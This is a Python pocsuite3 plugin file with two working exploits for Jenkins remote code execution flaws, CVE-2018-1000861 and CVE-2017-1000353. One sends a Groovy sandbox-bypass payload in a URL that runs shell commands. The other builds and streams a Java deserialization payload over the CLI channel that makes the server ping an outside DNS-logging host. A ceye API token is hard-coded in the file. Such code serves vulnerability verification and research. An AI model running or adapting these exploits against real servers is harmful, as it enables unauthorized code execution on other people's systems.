#!/usr/bin/env python
#coding=utf-8

import random
import json
import time
from string import ascii_letters
import threading
import uuid
import subprocess
import os

from pocsuite3.api import requests as req
from pocsuite3.api import register_poc
from pocsuite3.api import Output, POCBase
from pocsuite3.api import POC_CATEGORY, VUL_TYPE

# 需要CVE-2017-1000353-1.1-SNAPSHOT-all.jar包
# 

'''
CVE-2018-1000861
https://github.com/vulhub/vulhub/tree/master/jenkins/CVE-2018-1000861
'''
class Jenkins_RCE_2018_1000861_POC(POCBase):
    vulID = 'Jenkins-CVE-2018-1000861'
    appName = 'Jenkins'
    appVersion = 'Jenkins weekly <= 2.153; Jenkins LTS <= 2.138.3'
    category = POC_CATEGORY.EXPLOITS.REMOTE
    vulType = VUL_TYPE.CODE_EXECUTION
    vulDate = '2018-12-05'  # 漏洞公开的时间,不知道就写今天
    author = 'shadowsock5'  # PoC作者的大名
    createDate = '2019-02-24'  # 编写 PoC 的日期
    updateDate = '2020-02-24'  # PoC 更新的时间,默认和编写时间一样
    references = ['https://jenkins.io/security/advisory/2018-12-05/#SECURITY-595']  # 漏洞地址来源,0day不用写
    name = 'Jenkins RCE CVE-2018-1000861'  # PoC 名称
    install_requires = []  # PoC 第三方模块依赖，请尽量不要使用第三方模块，必要时请参考《PoC第三方模块依赖说明》填写
    cvss = u"高危"

    
    # 使用随机字符串作为banner，通过ceye的接口判断命令是否被执行
    DOMAIN = 'wvg689.ceye.io'
    TOKEN = '76dce59a986eab595838f7dc74903035'
    BANNER = ''.join([random.choice(ascii_letters) for i in range(6)])
    CEYE_URL = 'http://api.ceye.io/v1/records?token={0}&type=dns&filter={1}'.format(TOKEN, BANNER)

    http_proxy  = "http://127.0.0.1:8087"
    proxies = {"http": http_proxy, "https": http_proxy}

    def _verify(self):
        result={}

        vul_url = self.url
        target_url = vul_url
        
        #command = "'ping {0}.{1}'".format(self.BANNER, self.DOMAIN)
        command = "touch /tmp/jenkins_{0}".format(self.BANNER)

        payload_url = vul_url + '/securityRealm/user/admin/descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript' + \
        '?sandbox=true&value=' + \
        'public class x %7b public x()%7b"{0}".execute()%7d%7d'.format(command)
        
        try:
            req.get(payload_url, proxies=self.proxies)
        except Exception as e:
            e.printStackTrace()
        
        time.sleep(2) # 休眠2s等待ceye生成记录
        if self.test_dnslog(self.CEYE_URL):
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = target_url
            return self.save_output(result)
        return self.save_output(result)

    # 验证DNS已被解析，命令执行
    def test_dnslog(self, url):
        resp = req.get(url)
        d = resp.json()
        try:
            name = d['data'][0]['name']
            if self.BANNER in name:
                return True
        except Exception:
            return False            

    # 攻击模块
    def _attack(self):
        return self._verify()

    # 输出报告
    def save_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail()
        return output


'''
CVE-2017-1000353
https://github.com/vulhub/vulhub/tree/master/jenkins/CVE-2017-1000353
'''
class Jenkins_RCE_2017_1000353_POC(POCBase):
    vulID = 'Jenkins-CVE-2017-1000353'
    appName = 'Jenkins'
    appVersion = 'Jenkins主版本 <=2.56版本; Jenkins LTS  <=2.46.1版本'
    category = POC_CATEGORY.EXPLOITS.REMOTE
    vulType = VUL_TYPE.CODE_EXECUTION
    vulDate = '2017-04-26'  # 漏洞公开的时间,不知道就写今天
    author = 'shadowsock5'  # PoC作者的大名
    createDate = '2019-02-24'  # 编写 PoC 的日期
    updateDate = '2020-02-24'  # PoC 更新的时间,默认和编写时间一样
    references = ['https://jenkins.io/security/advisory/2017-04-26/#cli-unauthenticated-remote-code-execution']  # 漏洞地址来源,0day不用写
    name = 'Jenkins反序列化RCE'  # PoC 名称
    install_requires = []  # PoC 第三方模块依赖，请尽量不要使用第三方模块，必要时请参考《PoC第三方模块依赖说明》填写
    cvss = u"高危"

    
    # 使用随机字符串作为banner，通过ceye的接口判断命令是否被执行
    DOMAIN = 'wvg689.ceye.io'
    TOKEN = '76dce59a986eab595838f7dc74903035'
    BANNER = ''.join([random.choice(ascii_letters) for i in range(6)])
    CEYE_URL = 'http://api.ceye.io/v1/records?token={0}&type=dns&filter={1}'.format(TOKEN, BANNER)

    PREAMLE = b'<===[JENKINS REMOTING CAPACITY]===>rO0ABXNyABpodWRzb24ucmVtb3RpbmcuQ2FwYWJpbGl0eQAAAAAAAAABAgABSgAEbWFza3hwAAAAAAAAAH4='
    PROTO = b'\x00\x00\x00\x00'
    FILE_SER = None

    http_proxy  = "http://127.0.0.1:8087"
    proxies = {"http": http_proxy, "https": http_proxy}


    def _verify(self):
        result={}

        vul_url = self.url + "/cli"
        target_url = self.url

        host = vul_url.strip("http://").strip("https://").split(':')[0]
        port = vul_url.strip("http://").strip("https://").split(':')[1]
        
        # 云上JAR包文件路径
        JAR_PATH = "~/GitProjects/vulhub/jenkins/CVE-2017-1000353/CVE-2017-1000353-1.1-SNAPSHOT-all.jar"

        #payload = "/System/Applications/Calculator.app/Contents/MacOS/Calculator"
        payload = "'ping {0}.{1}'".format(self.BANNER, self.DOMAIN)
        #payload = "'touch /tmp/jenkins_{0}'".format(self.BANNER)

        out_ser = "jenkins_poc.ser"

        command1 = "java -jar {0} {1} {2}".format(JAR_PATH, out_ser, payload)

        # 第一步，根据payload生成序列化文件
        pro = subprocess.Popen(command1,
                stdout=subprocess.PIPE,shell=True, preexec_fn=os.setsid)
        print(command1)
        
        try:
            # 读取第一步生成的序列化文件
            with open(out_ser, "rb") as f:
                self.FILE_SER = f.read()
            
            session = str(uuid.uuid4())
            t = threading.Thread(target=self.download, args=(vul_url, session))
            t.start()

            self.upload_chunked(vul_url, session, "asdf")
        except Exception as e:
            e.printStackTrace()
        
        time.sleep(2) # 休眠2s等待ceye生成记录
        if self.test_dnslog(self.CEYE_URL):
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = target_url
            return self.save_output(result)
        return self.save_output(result)


    def null_payload(self):
        yield b" "


    def generate_payload(self):
        payload = self.PREAMLE + self.PROTO + self.FILE_SER
        return payload


    def generate_payload_chunked(self):
        yield self.PREAMLE
        yield self.PROTO
        yield self.FILE_SER


    def download(self, url, session):
        headers = {'Side' : 'download'}
        headers['Content-type'] = 'application/x-www-form-urlencoded'
        headers['Session'] = session
        headers['Transfer-Encoding'] = 'chunked'
        r = req.post(url, data=self.null_payload(), headers=headers, proxies=self.proxies, stream=True, verify=False)
        #print(r.content)


    def upload(url, session, data):
        headers = {'Side' : 'upload'}
        headers['Session'] = session
        headers['Content-type'] = 'application/octet-stream'
        headers['Accept-Encoding'] = None
        r = req.post(url, data=data, headers=headers, proxies=self.proxies, verify=False)


    def upload_chunked(self, url,session, data):
        headers = {'Side' : 'upload'}
        headers['Session'] = session
        headers['Content-type'] = 'application/octet-stream'
        headers['Accept-Encoding']= None
        headers['Transfer-Encoding'] = 'chunked'
        headers['Cache-Control'] = 'no-cache'
        r = req.post(url, headers=headers, data=self.generate_payload_chunked(), proxies=self.proxies, verify=False)


    # 验证DNS已被解析，命令执行
    def test_dnslog(self, url):
        resp = req.get(url)
        d = resp.json()
        try:
            name = d['data'][0]['name']
            if self.BANNER in name:
                return True
        except Exception:
            return False            

    # 攻击模块
    def _attack(self):
        return self._verify()

    # 输出报告
    def save_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail()
        return output

# 注册类
register_poc(Jenkins_RCE_2018_1000861_POC)
register_poc(Jenkins_RCE_2017_1000353_POC)


